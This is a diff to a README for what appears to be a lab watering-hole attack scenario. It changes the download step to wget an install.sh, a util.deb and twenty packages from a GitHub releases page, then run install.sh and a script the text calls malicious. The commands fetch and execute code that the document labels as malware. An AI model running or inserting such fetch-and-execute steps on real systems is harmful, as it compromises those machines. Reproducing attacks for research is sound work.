@@ -62,14 +62,35 @@ stop: /home/chuqi/local/nginx/sbin/nginx -s stop
 
 1. Download several packages via wget 
 ```
-wget https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-malware https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-pkg1 https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-pkg2
+wget https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/install.sh \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/util.deb\
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg1 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg2 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg3 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg4 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg5 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg6 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg7 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg8 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg9 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg10 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg11 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg12 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg13 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg14 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg15 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg16 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg17 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg18 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg19 \
+        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg20 \
 
-chmod 777 wh-*
+./install.sh
 ```
-2. Execute `wh-malware`
+2. Execute malicious `util.sh`
 
 ```
-./wh-malware
+util.sh
 ```
 
 **Exploit (Attacker IP2)**    
